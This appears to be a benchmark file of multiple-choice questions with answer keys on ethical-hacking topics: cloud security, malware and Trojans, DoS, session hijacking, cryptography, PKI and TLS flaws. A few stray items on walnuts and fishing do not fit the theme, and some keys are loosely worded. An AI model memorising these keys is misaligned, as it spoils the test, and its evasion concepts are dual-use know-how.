index,question,options,answer_key
242,Which of the following is NOT listed as a type of cloud computing service in the text?,"{'A': 'Infrastructure as a Service (IaaS)', 'B': 'Virtualization as a Service (VaaS)', 'C': 'Security as a Service (SECaaS)', 'D': 'Platform as a Service (PaaS)'}",B
243,What is the primary purpose of a container in the context of application deployment?,"{'A': 'To virtualize an entire operating system for isolated execution.', 'B': 'To package a single application and its dependencies for consistent deployment.', 'C': 'To manage clusters of distributed virtual machines.', 'D': 'To provide a shared network for public cloud services.'}",B
244,Which cloud deployment model involves the infrastructure being shared by multiple organizations that typically share similar policy and compliance requirements?,"{'A': 'Public cloud', 'B': 'Private cloud', 'C': 'Community cloud', 'D': 'Hybrid cloud'}",C
245,Which professional organization is dedicated to promoting cloud security best practices and organizing cloud security professionals?,"{'A': 'Federal Risk and Authorization Management Program (FedRAMP)', 'B': 'Trusted Computing Group (TCG)', 'C': 'Cloud Special Interest Group PCI Security Standards Council', 'D': 'Cloud Security Alliance (CSA)'}",D
246,Which of the following is a tool designed to offer penetration-testing as a service for Amazon Web Services EC2 users?,"{'A': 'CloudPassage Halo', 'B': 'Qualys Cloud Suite', 'C': 'Core CloudInspect', 'D': ""Trend Micro's Instant-On Cloud Security""}",C
247,"Which type of attack exploits vulnerabilities in the bare-metal cloud server itself, utilizing backdoor channels to bypass security operations?","{'A': 'Session riding', 'B': 'Cloud hopper attack', 'C': 'Man-in-the-cloud (MITC) attack', 'D': 'Cloudbourne attack'}",D
248,Which tool is specifically mentioned for examining Kubernetes cluster vulnerabilities?,"{'A': 'S3Inspector', 'B': 'Trivy', 'C': 'Sysdig', 'D': 'Pacu'}",C
249,Which of the following tools is designed to identify potential leaks and credentials in target clouds?,"{'A': 'dockerscan', 'B': 'Cloud Container Attack Tool (CCAT)', 'C': 'DumpsterDiver', 'D': 'AWS pwn'}",C
250,"In the NIST Cloud Computing Reference Architecture, which component is responsible for acquiring and utilizing cloud products and services?","{'A': 'Cloud provider', 'B': 'Cloud carrier', 'C': 'Cloud broker', 'D': 'Cloud consumer'}",D
251,"Which cloud computing service model provides a development platform, allowing subscribers to build applications without managing the underlying infrastructure?","{'A': 'Infrastructure as a Service (IaaS)', 'B': 'Platform as a Service (PaaS)', 'C': 'Software as a Service (SaaS)', 'D': 'Virtual Machine as a Service (VMaaS)'}",B
252,"What natural compound found in walnut hulls can be lethal to plants and displace oxygen in water, potentially killing fish?","{'A': 'Tannins', 'B': 'Herbicides', 'C': 'Gunpowder', 'D': 'Sweet tea'}",A
253,What is the primary purpose of using a bag filled with old walnuts in the described scenario?,"{'A': 'To oxygenate the pond water.', 'B': 'To attract and catch fish.', 'C': 'To measure the depth of the pond.', 'D': 'To fertilize the pond ecosystem.'}",B
254,"From a hacker's perspective, what can malware be considered if used within the confines of an agreed-upon contract in a pen test?","{'A': 'A tool to spread viruses and worms.', 'B': 'A means to cause destruction and inconvenience.', 'C': 'A usable asset for a successful exploit.', 'D': 'An illegal and unethical practice.'}",C
255,"Which of the following tools is routinely flagged as malware by anti-malware applications, despite its function of simply opening and closing ports?","{'A': 'Netcat', 'B': 'A Trojan', 'C': 'A virus', 'D': 'An add-on'}",A
256,Which type of malware is designed to disguise its code and intended purpose?,"{'A': 'Downloader', 'B': 'Injector', 'C': 'Obfuscator', 'D': 'Dropper'}",C
257,Which of the following is a method for disguising malware as a legitimate application?,"{'A': 'Using brute-force password attacks', 'B': 'Implementing DDoS attacks', 'C': 'Employing wrappers to bind malware to innocent files', 'D': 'Conducting port scanning'}",C
258,"Which of the following methods are used to disguise malware, making it harder for signature-based anti-malware to detect it?","{'A': 'File encryption and code obfuscation', 'B': 'Data compression and file renaming', 'C': 'Digital watermarking and hashing', 'D': 'Sandboxing and virtual machine isolation'}",A
259,Which of the following is a method for evading antivirus software mentioned in the text?,"{'A': 'Encrypting the Trojan and converting its file extension to .exe', 'B': 'Breaking the Trojan into multiple segments and zipping them into a single file', 'C': 'Using a hex editor to change the file size of the Trojan', 'D': 'Converting the Trojan to a PDF file and embedding it in an image'}",B
260,Which type of Trojan is designed to provide backdoor access to a system via command-line access?,"{'A': 'Defacement Trojan', 'B': 'Command Shell Trojan', 'C': 'Proxy Server Trojan', 'D': 'Remote Access Trojan'}",B
261,What is Netcat often referred to as in the context of TCP/IP hacking?,"{'A': 'The firewall bypass tool', 'B': 'The packet sniffer', 'C': 'The Swiss Army knife', 'D': 'The encryption encoder'}",C
262,"Which of the following port numbers is mentioned as being commonly used by Trojans for illicit purposes, despite also being the default for an FTP server?","{'A': 'Port 443', 'B': 'Port 53', 'C': 'Port 21', 'D': 'Port 80'}",C
263,Which command can be used in Windows to display all active connections and listening ports numerically?,"{'A': 'netstat -b', 'B': 'netstat -a', 'C': 'netstat -an', 'D': 'netstat -cl'}",C
264,"Which command is useful for displaying active connections and the processes utilizing them, aiding in the detection of spyware and malware?","{'A': 'netstat -a', 'B': 'netstat -b', 'C': 'netstat -p', 'D': 'netstat -s'}",B
265,Which of the following is NOT mentioned as a tool for monitoring registry changes?,"{'A': 'SysAnalyzer', 'B': 'Malwarebytes', 'C': 'Tiny Watcher', 'D': 'Service Manager Plus'}",D
266,What is a characteristic of a computer virus?,"{'A': 'It can only be spread through direct physical contact.', 'B': 'It requires user interaction to initiate replication by attaching itself to other executable codes.', 'C': 'It is a program that solely aims to annoy users without causing any data loss.', 'D': 'It always alerts the user immediately upon infection with obvious signs.'}",B
267,What type of malicious software is designed to deny access to a computer system or data until a ransom is paid?,"{'A': 'Trojan', 'B': 'Worm', 'C': 'Ransomware', 'D': 'Virus'}",C
268,"What type of cyberattack is described in the text, characterized by a message demanding payment for data release?","{'A': 'Phishing', 'B': 'Malware injection', 'C': 'Denial-of-service attack', 'D': 'Ransomware'}",D
269,What was the most plausible initial point of entry reported for the Colonial Pipeline cyberattack?,"{'A': 'A phishing campaign', 'B': 'A carefully executed social engineering effort', 'C': 'An inside threat actor', 'D': 'A set of stolen VPN credentials'}",D
270,What security vulnerability allowed attackers to gain unauthorized access to the company's VPN?,"{'A': 'The VPN account was actively in use during the attack time frame.', 'B': ""The company's VPN did not implement multi-factor authentication."", 'C': 'The employee whose credentials were used fell victim to a phishing attack.', 'D': 'The VPN account had not been disabled despite being previously hacked.'}",B
271,"Which well-known ransomware attack, occurring in May 2017, spread to over 230,000 machines in 150 countries by exploiting an unpatched SMB vulnerability known as ""Eternal Blue""?","{'A': 'Dharma', 'B': 'SamSam', 'C': 'WannaCry', 'D': 'eCh0raix'}",C
272,Which of the following ransomware families is noted for targeting Linux devices with QNAP NAS?,"{'A': 'Dharma', 'B': 'eCh0raix', 'C': 'SamSam', 'D': 'Petya'}",B
273,What is a key characteristic of a worm in cybersecurity?,"{'A': 'It always modifies existing files on a system.', 'B': 'It is a self-replicating program that uses a computer network to spread.', 'C': 'It requires human intervention to propagate to other systems.', 'D': 'Its primary use is to encrypt files for ransom.'}",B
274,What action did a researcher take to halt the spread of the WannaCry ransomware?,"{'A': 'Developed a new antivirus signature.', 'B': 'Reported the vulnerability to the affected organizations.', 'C': 'Registered an unregistered domain and set up a sinkhole server.', 'D': 'Discovered and deployed a patch for the exploited vulnerability.'}",C
275,What was the primary target of the cyber disruption campaign involving Stuxnet against Iran's nuclear facilities?,"{'A': 'Communication networks', 'B': 'Financial systems', 'C': 'Centrifuges', 'D': 'Energy grids'}",C
276,Fileless malware is characterized by its ability to:,"{'A': 'Utilize legitimate programs to infect a computer and avoid detection by leaving no file footprint.', 'B': 'Always leave a detectable footprint on the infected system.', 'C': 'Rely on the creation and installation of new executable files.', 'D': 'Be easily detected and removed using traditional antivirus software.'}",A
277,What is a key characteristic of fileless malware that differentiates it from traditional malware regarding its execution and persistence?,"{'A': 'It always requires installation of new executable files on the target system.', 'B': 'It resides in RAM and can utilize native system tools, with attackers potentially using the registry to ensure persistence through reboots.', 'C': 'It can only be removed by completely wiping the hard drive, as it embeds itself deep within the operating system files.', 'D': 'It cannot be introduced through common methods like phishing emails or malicious websites, relying solely on direct physical access.'}",B
278,"Which of the following is a cited example of fileless malware that uses the registry for execution, persistence, and storage, and PowerShell to interject into other processes?","{'A': 'Stuxnet', 'B': 'Duqu', 'C': 'Divergent', 'D': 'All of the above'}",C
279,Which of the following is a core method of malware analysis that involves examining the executable code without actually running it?,"{'A': 'Dynamic analysis', 'B': 'File fingerprinting', 'C': 'Static analysis', 'D': 'Malware scanning'}",C
280,"Which of the following tools is used to identify packing, crypters, and compilers within an executable file?","{'A': 'BinText', 'B': 'PEiD', 'C': 'Dependency Walker', 'D': 'IDA'}",B
281,"When analyzing malware dynamically, what is a recommended first step to ensure safety and prevent network compromise?","{'A': 'Submit the malware to an online scanner like VirusTotal.', 'B': 'Execute the malware on a connected device within the network.', 'C': 'Set up an isolated test bed, such as a virtual machine with the NIC in host-only mode and no open shares.', 'D': 'Analyze the runtime state of the system using data found in RAM.'}",C
282,"When analyzing malware's impact in an isolated environment, what is crucial to take before starting the analysis?","{'A': 'A network traffic capture', 'B': 'A system snapshot of the baseline', 'C': 'An API call log', 'D': 'A list of running processes'}",B
283,Which of the following tools can be used to monitor file and folder activity?,"{'A': 'API Monitor', 'B': 'Tripwire', 'C': 'DNSstuff', 'D': 'TCPView'}",B
284,"According to the text, why might signature-based antivirus software struggle to keep up with modern malware?","{'A': 'Malware is increasingly running in memory rather than on disk.', 'B': 'Heuristic antivirus is too complex for most systems.', 'C': 'Antivirus programs create a false sense of security, making users less vigilant.', 'D': 'Dynamic ports used by malware are too numerous to track effectively.'}",A
285,Which of the following is described as ransomware that utilizes brute-force tactics against RDP?,"{'A': 'Emotet', 'B': 'SamSam', 'C': 'Cultureresource.exe', 'D': 'Netizen'}",B
286,"When a long journey, whether physical or intellectual, is nearing its end, and the destination is within reach, what is the natural human instinct regarding progress?","{'A': 'To slow down and appreciate the surroundings.', 'B': ""To increase the pace and 'sprint' towards the goal."", 'C': 'To stop and take a break to rest.', 'D': 'To re-evaluate the route and make detours.'}",B
287,"What is a common motivation for an attacker to execute a Denial-of-Service (DoS) attack, besides solely attempting to breach defenses?","{'A': 'To prevent the spread of information or to embarrass the target.', 'B': 'To gain unauthorized access to sensitive data.', 'C': 'To install malware on the target system.', 'D': 'To create a backdoor for future access.'}",A
288,What is a key characteristic of a Distributed Denial-of-Service (DDoS) attack?,"{'A': 'It originates from a single system to overwhelm a target.', 'B': 'It aims to grant unauthorized access to a network.', 'C': 'It is typically carried out by a network of compromised computers, often forming a botnet.', 'D': 'Its primary purpose is to encrypt sensitive data for security purposes.'}",C
289,Which type of DoS/DDoS attack aims to exhaust resources by flooding a target with SYN connection requests?,"{'A': 'Volumetric attacks', 'B': 'Application layer attacks', 'C': 'Protocol attacks', 'D': 'TCP state-exhaustion attacks'}",C
290,"Which type of attack involves sending a large number of ICMP Echo packets to a target with a spoofed source address, causing the target to respond to a non-existent address and hit a packet-per-second limit?","{'A': 'SYN flood', 'B': 'UDP flood', 'C': 'ICMP flood', 'D': 'Smurf'}",C
291,Which type of DDoS attack exploits a vulnerability before it is known and patched by the target?,"{'A': 'Pulse wave', 'B': 'Permanent Phlashing', 'C': 'Zero day', 'D': 'Protocol attack'}",C
292,"Which DoS tool operates by tying up open sockets, causing services to hang, and is particularly effective against certain web servers like Apache?","{'A': 'LOIC', 'B': 'R-U-Dead-Yet (RUDY)', 'C': 'Slowloris', 'D': 'Tribe Flood Network'}",C
293,"What is the primary objective of session hijacking, as described in the text?","{'A': 'To shut down a server by overwhelming it with traffic.', 'B': 'To steal an active user session after authentication is complete.', 'C': 'To block all legitimate traffic from an ISP.', 'D': ""To impersonate a user's address for passive traffic sniffing.""}",B
294,What is the primary mechanism TCP uses that makes session hijacking possible?,"{'A': 'Its use of UDP datagrams', 'B': 'Its session-oriented nature and unique packet sequence numbers', 'C': ""Its reliance on the Transmission Control Protocol (TCP) flag 'FIN'"", 'D': 'Its ability to transmit data in parallel streams'}",B
295,"In TCP communication, what does the 'window size' field indicate to the recipient?","{'A': 'The next expected sequence number for an acknowledgment.', 'B': 'The maximum amount of data that can be sent before an acknowledgment is required.', 'C': 'The initial sequence number of the sender.', 'D': 'The total number of bytes transmitted in a single segment.'}",B
296,"Which of the following tools is described as a ""packet sniffer on steroids"" and a ""man-in-the-middle"" tool, and is native to Linux?","{'A': 'T-sight', 'B': 'Ettercap', 'C': 'Cobalt Strike', 'D': 'Burp Suite'}",B
297,Which of the following is a measure to protect against session hijacking?,"{'A': 'Using predictable session IDs', 'B': 'Maximizing remote access', 'C': 'Using encryption to protect the channel', 'D': 'Disabling all incoming connections'}",C
298,Which IPSec protocol guarantees the integrity and authentication of an IP packet sender?,"{'A': 'Encapsulating Security Payload (ESP)', 'B': 'Internet Key Exchange (IKE)', 'C': 'Authentication Header (AH)', 'D': 'Oakley'}",C
299,What is the primary purpose of 'speculative processing' in processors?,"{'A': 'To encrypt sensitive data before it is stored.', 'B': 'To predict and execute future operations to improve speed.', 'C': 'To automatically patch vulnerabilities as they are discovered.', 'D': 'To isolate applications from each other to prevent data leakage.'}",B
300,"What is the primary function of a ""payload"" in the context of malware?","{'A': 'To steal data from the target system.', 'B': ""To allow control over the target after exploitation or perform the attacker's intended action."", 'C': 'To inject code into running processes to alter execution.', 'D': 'To download additional malware from an internet connection.'}",B
301,Which malware distribution method involves embedding malicious code directly into advertising networks that appear on screen?,"{'A': 'Drive-by downloads', 'B': 'Clickjacking', 'C': 'Malvertising', 'D': 'SPAM emails'}",C
302,What is the primary function of a Trojan horse in cybersecurity?,"{'A': 'To compress malware executables to reduce file size.', 'B': 'To replicate itself by attaching to other executable codes.', 'C': 'To appear legitimate to the user while performing malicious actions in the background.', 'D': 'To deny access to a computer system until a ransom is paid.'}",C
303,Which type of malware replicates itself across networks without human intervention and is often used to create botnets?,"{'A': 'Ransomware', 'B': 'Fileless malware', 'C': 'Worm', 'D': 'Trojan horse'}",C
304,Which of the following is a technique used in static malware analysis that involves examining human-readable text within the executable code?,"{'A': 'File fingerprinting', 'B': 'Performing strings search', 'C': 'Malware scanning', 'D': 'Identifying packing/obfuscation'}",B
305,Which of the following types of information can be obtained by analyzing Portable Executable (PE) file metadata?,"{'A': 'Source code and developer names', 'B': 'Date of compilation, libraries, and functions', 'C': 'Network traffic patterns and IP addresses', 'D': 'User login credentials and passwords'}",B
306,"What type of malware is Emotet described as, commonly spread via email, and known to communicate with an external command-and-control server?","{'A': 'Ransomware', 'B': 'Spyware', 'C': 'Banking Trojan', 'D': 'Worm'}",C
307,"Which IPSec protocol provides confidentiality through encryption, along with origin authenticity and integrity?","{'A': 'Authentication Header (AH)', 'B': 'Encapsulating Security Payload (ESP)', 'C': 'Internet Key Exchange (IKE)', 'D': 'Oakley'}",B
308,What is the primary function of a file-integrity-checking application like Tripwire in the context of security?,"{'A': 'To quarantine and remove malware immediately.', 'B': 'To scan and remove malware after a detection.', 'C': 'To reject malware packets intended for the kernel.', 'D': 'To alert users about modifications to system files, potentially indicating malware.'}",D
309,Which type of DoS attack consumes all available bandwidth for a system or service?,"{'A': 'Fragmentation attacks', 'B': 'Volumetric attacks', 'C': 'Application attacks', 'D': 'TCP state-exhaustion attacks'}",B
310,Which type of attack consumes all available bandwidth for a system or service?,"{'A': 'SYN flood', 'B': 'Volumetric attack', 'C': 'Session hijacking', 'D': 'Teardrop attack'}",B
311,The Polybius square was developed by the Greek philosopher and historian Polybius as a method for what purpose?,"{'A': 'To analyze government structures and separation of powers.', 'B': 'To encrypt messages and keep his writings secret.', 'C': 'To chronicle the Roman rise to power.', 'D': 'To develop new cryptographic algorithms.'}",B
312,What is the term for the study and methods used to crack encrypted communications?,"{'A': 'Cryptography', 'B': 'Steganography', 'C': 'Cryptanalysis', 'D': 'Polybius square'}",C
313,What is the primary goal of cryptography as described in the text?,"{'A': 'To hide messages within images.', 'B': 'To develop methods for decrypting encrypted communications.', 'C': 'To render information unusable to unauthorized individuals.', 'D': 'To historically trace the origins of steganography.'}",C
314,Which security function does encryption most commonly help to provide by ensuring that only those with the correct key can access data?,"{'A': 'Integrity', 'B': 'Availability', 'C': 'Confidentiality', 'D': 'Nonrepudiation'}",C
315,What are the two primary forms of encryption for bits mentioned in the text?,"{'A': 'Substitution and Permutation', 'B': 'Transposition and Encryption', 'C': 'Substitution and Transposition', 'D': 'Cipher and Algorithm'}",C
316,"Which type of cipher encrypts data bits by feeding them into the algorithm one at a time, often using an XOR operation?","{'A': 'Block ciphers', 'B': 'Asymmetric ciphers', 'C': 'Stream ciphers', 'D': 'Symmetric ciphers'}",C
317,"According to the text, what is a critical factor in the security of XOR ciphers that, if the key is shorter than the data, can make the cipher vulnerable to frequency attacks?","{'A': 'The size of the data block', 'B': 'The algorithm used for encryption', 'C': 'The length of the key', 'D': 'The type of input data (block vs. stream)'}",C
318,What is a significant drawback of symmetric key encryption?,"{'A': 'It is too slow for bulk encryption needs.', 'B': 'It requires a unique key for every pair of communicating parties.', 'C': 'It is vulnerable to brute-force attacks due to large key sizes.', 'D': 'Key distribution and management are straightforward and simple.'}",B
319,"Which block cipher, designed to replace DES, uses key lengths of 128, 192, or 256 bits and is notably faster than both DES and 3DES?","{'A': '3DES', 'B': 'IDEA', 'C': 'AES', 'D': 'Blowfish'}",C
320,What is a primary security concern with symmetric encryption that necessitates the use of asymmetric encryption?,"{'A': 'Its inability to provide confidentiality.', 'B': 'The difficulty of securely distributing the single encryption key.', 'C': 'The overhead of generating two separate keys for each communication.', 'D': 'Its slowness in encrypting large amounts of data.'}",B
321,"In asymmetric encryption, which key is primarily used for encrypting a message when exchanging information securely?","{'A': 'The private key', 'B': 'The symmetric key', 'C': 'The public key', 'D': 'The shared secret key'}",C
322,"Which asymmetric algorithm is known for its use in Transport Layer Security (TLS), Secure Sockets Layer (SSL), and IPSec encryption, but can be vulnerable to man-in-the-middle attacks if digital signatures are not used?","{'A': 'Elliptic Curve Cryptosystem (ECC)', 'B': 'RSA', 'C': 'Diffie-Hellman', 'D': 'Advanced Encryption Standard (AES)'}",C
323,Which cryptographic algorithm is known for its use of two large prime numbers to achieve strong encryption and can be used for both encryption and digital signatures?,"{'A': 'El Gamal', 'B': 'RSA', 'C': 'Hashing Algorithms', 'D': 'Symmetric Encryption'}",B
324,Which characteristic of blockchain technology makes it easy to discover changes made to its data?,"{'A': 'Its association with cryptocurrency like Bitcoin.', 'B': 'The decentralized nature of its authority and power.', 'C': 'The chronological storage of transactions as blocks in a shared ledger.', 'D': 'The requirement to copy and append a changed block to the end of the chain.'}",D
325,"What is a key characteristic of a cryptographic hash used for integrity checks, as described in the text?","{'A': 'It can be easily reversed to reveal the original data.', 'B': 'It is designed to be a form of encryption.', 'C': 'It is a one-way function that cannot be reverse-engineered.', 'D': 'It requires a secret key to generate the output.'}",C
326,"Which hash algorithm, originally popular for ensuring file integrity, is now considered obsolete due to flaws and advancements in other algorithms?","{'A': 'SHA-256', 'B': 'MD5', 'C': 'SHA-1', 'D': 'CRC32'}",B
327,"Which hash algorithm, developed by the NSA, was initially mandated for U.S. government applications but later recommended for replacement due to discovered flaws?","{'A': 'SHA-2', 'B': 'RIPEMD-160', 'C': 'SHA-1', 'D': 'SHA-3'}",C
328,What type of attack specifically targets hashing algorithms by exploiting the possibility of two different inputs producing the same output?,"{'A': 'A man-in-the-middle attack', 'B': 'A brute-force attack', 'C': 'A collision attack', 'D': 'A denial-of-service attack'}",C
329,What is the primary purpose of a rainbow table in the context of cybersecurity attacks described in the text?,"{'A': 'To encrypt user credentials for enhanced security.', 'B': 'To store pre-computed hash values of common passwords and phrases to speed up brute-force attacks.', 'C': 'To verify the integrity of data by comparing original and hashed values.', 'D': 'To act as a secure database for storing user login attempts.'}",B
330,What is a salt used for in the context of protecting password files against collision attacks?,"{'A': 'It is a hardware system that speeds up password cracking.', 'B': 'It is a collection of random bits used as an additional key in the hashing algorithm.', 'C': 'It is a software program that identifies and removes malware.', 'D': 'It is a method for securely storing passwords in plain text.'}",B
331,What does the acronym GAK stand for in the context of government access to encryption?,"{'A': 'General Access to Keys', 'B': 'Government Access to Keys', 'C': 'Global Authority for Keying', 'D': 'Guaranteed Access for Knowledge'}",B
332,"According to the Australian Assistance and Access Act, what right does the government claim regarding technology companies and developers?","{'A': 'The right to compel companies to create new encryption methods.', 'B': 'The right to compel companies to reengineer encrypted items for government use.', 'C': 'The right to compel companies to provide access to user data without a warrant.', 'D': 'The right to compel companies to develop specific software for national security.'}",B
333,What is the primary purpose of steganography in cybersecurity?,"{'A': 'To encrypt messages to prevent unauthorized access.', 'B': 'To hide a message within another medium so its existence is concealed.', 'C': 'To create unique digital fingerprints for files.', 'D': 'To securely transmit large files over a network.'}",B
334,"Which steganography technique involves modifying the luminescence of image parts, often on grayscale images?","{'A': 'Least significant bit insertion', 'B': 'Algorithmic transformation', 'C': 'Masking and filtering', 'D': 'Phase encoding'}",C
335,"Which of the following is a tool that can be used for steganography, according to the text?","{'A': 'MP3Stego', 'B': 'OpenSSL', 'C': 'VLC Media Player', 'D': 'Wireshark'}",A
336,What is a primary benefit of using hardware encryption devices regarding system performance?,"{'A': 'They increase the overall complexity of encryption algorithms.', 'B': ""They offload encryption tasks from the system's main processor."", 'C': 'They require additional software to be installed for full functionality.', 'D': 'They are primarily designed to run add-on software for enhanced features.'}",B
337,What is the primary function of a private key in asymmetric encryption schemes?,"{'A': 'To encrypt messages for public distribution.', 'B': 'To decrypt messages that have been encrypted with the corresponding public key.', 'C': 'To generate new pairs of public and private keys.', 'D': 'To verify the authenticity of digital signatures.'}",B
338,"In a classic asymmetric encryption scheme, what is a minimum set of keys that must be created, managed, distributed, stored, and revoked?","{'A': 'A single symmetric key', 'B': 'A public key and a private key', 'C': 'Multiple symmetric keys for each user', 'D': 'A passphrase and a digital signature'}",B
339,What is the primary role of a Certificate Authority (CA) in a Public Key Infrastructure (PKI) system?,"{'A': 'To encrypt sensitive data for users.', 'B': 'To create and issue digital certificates to verify identity.', 'C': 'To store private keys securely for all users.', 'D': 'To manage network firewalls and intrusion detection systems.'}",B
340,What is the primary role of a Certificate Authority (CA) in a Public Key Infrastructure (PKI) system regarding public keys?,"{'A': 'To generate private keys for users.', 'B': 'To distribute private keys to recipients.', 'C': 'To validate the ownership of public keys.', 'D': 'To encrypt all communication between users.'}",C
341,"In a Public Key Infrastructure (PKI) system, what action by the Certificate Authority (CA) is essential for validating a user's entire system?","{'A': 'Generating the key pair for encryption', 'B': ""Verifying the user's identity with a driver's license"", 'C': 'Asking about the purpose and duration of encryption keys', 'D': ""Digitally signing the user's key""}",D
342,Which digital certificate model utilizes subordinate Registration Authorities (RAs) to issue and manage certificates under a root Certificate Authority (CA)?,"{'A': 'Web of Trust', 'B': 'Single-Authority System', 'C': 'Hierarchical Trust System', 'D': 'Cross-Certification Model'}",C
343,Which field within a digital certificate identifies the entity that verifies its authenticity?,"{'A': 'Subject', 'B': 'Issuer', 'C': 'Serial Number', 'D': 'Valid From'}",B
344,"In the context of digital certificates and their security, what key is used by the Certificate Authority (CA) to sign a certificate before sending it to an individual?","{'A': ""The individual's private key"", 'B': ""The CA's public key"", 'C': ""The individual's public key"", 'D': ""The CA's private key""}",D
345,"For an application or service that is entirely internal to an organization, which type of certificate is generally considered the best choice due to cost and ease of implementation?","{'A': 'A certificate signed by a root CA', 'B': 'A self-signed certificate', 'C': 'A certificate signed by an unknown authority', 'D': 'A certificate requiring external validation'}",B
346,"Which type of certificate is generally trusted because its authenticity is validated through an external source, often a validation authority?","{'A': 'Self-signed certificates', 'B': 'Internal CA certificates', 'C': 'Signed certificates', 'D': 'Private key certificates'}",C
347,"Which key is used to encrypt the hash of a message to create a digital signature, thereby proving the sender's authenticity?","{'A': ""Bob's public key"", 'B': ""Joe's public key"", 'C': ""Bob's private key"", 'D': ""Joe's private key""}",C
348,What is the primary purpose of Public Key Infrastructure (PKI)?,"{'A': 'To develop new encryption algorithms', 'B': 'To manage the creation and distribution of digital certificates', 'C': 'To bypass network security protocols', 'D': 'To encrypt data while it is actively being transmitted'}",B
349,Which scenario describes data at rest?,"{'A': 'Data actively being transferred over a network.', 'B': 'Data stored on a laptop that is currently powered off.', 'C': 'Data being accessed and modified by a user on a live server.', 'D': 'Data in a cloud storage folder that is accessible via the internet.'}",B
350,Which type of encryption is recommended for laptops and mobile devices due to their portability and risk of theft?,"{'A': 'File-level encryption', 'B': 'Folder-level encryption', 'C': 'Full Disk Encryption (FDE)', 'D': 'Volume encryption'}",C
351,"According to NIST SP 800-53 Rev. 5, Control SC-28, which of the following are explicitly defined as data-at-rest locales?","{'A': 'SANs and network servers', 'B': 'Desktops, laptops, mobile devices, and storage devices', 'C': 'Cloud storage and virtual machines', 'D': 'Databases and application servers'}",B
352,Which of the following application layer protocols is described as not being secure and transmitting data in plain text?,"{'A': 'SMTP', 'B': 'TLS', 'C': 'SSH', 'D': 'HTTPS'}",A
353,Which of the following protocols is a secured version of Telnet that utilizes public key cryptography for encryption and defaults to TCP port 22?,"{'A': 'SSL', 'B': 'IPSec', 'C': 'SSH', 'D': 'TLS'}",C
354,"Which protocol verifies an IP packet's integrity and the validity of its source, providing authentication and integrity but not confidentiality?","{'A': 'Encapsulating Security Payload (ESP)', 'B': 'Pretty Good Privacy (PGP)', 'C': 'Authentication Header (AH)', 'D': 'Secure/Multipurpose Internet Mail Extensions (S/MIME)'}",C
355,What is the primary function of the heartbeat feature in OpenSSL that was exploited by Heartbleed?,"{'A': 'To encrypt all outgoing data with a public key.', 'B': 'To verify correct data reception by echoing data back.', 'C': 'To establish a secure session ID between client and server.', 'D': 'To generate a unique certificate for each connection.'}",B
356,"In the context of the Heartbleed vulnerability, what type of data is sent back from a vulnerable server's memory to an attacker?","{'A': 'Encrypted private keys only', 'B': 'A fixed block of 64KB of random memory data', 'C': 'Usernames and passwords exclusively', 'D': 'A precise list of all active network connections'}",B
357,What type of attack does FREAK (Factoring Attack on RSA-EXPORT Keys) exploit to achieve its goal?,"{'A': 'A buffer overflow vulnerability', 'B': 'A denial-of-service attack', 'C': 'A downgrade attack forcing weaker encryption key lengths', 'D': 'A cross-site scripting (XSS) vulnerability'}",C
358,"What vulnerability in SSL 3.0 allowed attackers to manipulate handshakes, leading to a fallback to the less secure protocol?","{'A': 'RC4 biases', 'B': 'Backward compatibility', 'C': 'TLS 1.2 implementation errors', 'D': 'Padding data modification'}",B
359,What is the primary vulnerability that TLS_FALLBACK_SCSV aims to prevent?,"{'A': 'Heartbleed', 'B': 'POODLE attacks by preventing fallback to SSL 3.0', 'C': 'Man-in-the-middle attacks in general', 'D': 'Data leakage through repeated password transmissions'}",B
360,Which of the following SSL/TLS versions were deprecated in RFC 8996?,"{'A': 'SSL 2.0 and SSL 3.0', 'B': 'TLS 1.0 and TLS 1.1', 'C': 'TLS 1.2 and TLS 1.3', 'D': 'SSL 3.0 and TLS 1.0'}",B
361,What is the primary impact of the DROWN attack on internet security?,"{'A': 'It causes denial-of-service by overwhelming servers.', 'B': 'It allows attackers to steal sensitive data by breaking encryption.', 'C': 'It forces users to update their operating systems to secure versions.', 'D': 'It compromises the integrity of data transfer by introducing corrupted packets.'}",B
362,Which type of attack involves an attacker encrypting multiple plaintext copies to gain the key?,"{'A': 'Cipher-text-only attack', 'B': 'Replay attack', 'C': 'Chosen plain-text attack', 'D': 'Known plain-text attack'}",C
363,Which type of attack involves monitoring environmental factors like power consumption and timing to compromise a cryptosystem?,"{'A': 'Chosen cipher attack', 'B': 'Man-in-the-middle attack', 'C': 'Side-channel attack', 'D': 'Brute-force attack'}",C
